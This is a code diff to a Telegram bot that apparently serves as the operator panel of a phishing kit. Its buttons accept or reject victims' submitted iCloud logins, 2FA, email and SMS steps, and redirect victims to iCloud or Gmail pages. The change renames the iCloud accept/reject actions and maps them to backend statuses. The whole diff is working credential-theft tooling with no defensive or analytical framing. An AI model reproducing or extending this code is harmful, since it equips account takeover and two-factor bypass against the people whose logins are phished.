@@ -31,14 +31,22 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "PAGE ACCEPT" : action === "page_reject" ? "PAGE REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "accept" ? "ICLOUD ACCEPT" : action === "reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
+
+    // ✅ Map iCloud accept/reject to correct status
+    let statusForBackend = action;
+    if (action === "accept") {
+      statusForBackend = "accepted";
+    } else if (action === "reject") {
+      statusForBackend = "rejected";
+    }
 
     const response = await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         email,
-        status: action
+        status: statusForBackend
       })
     });
 
@@ -90,9 +98,9 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
-      } else if (action === "page_accept") {
+      } else if (action === "accept") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
-      } else if (action === "page_reject") {
+      } else if (action === "reject") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
         statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
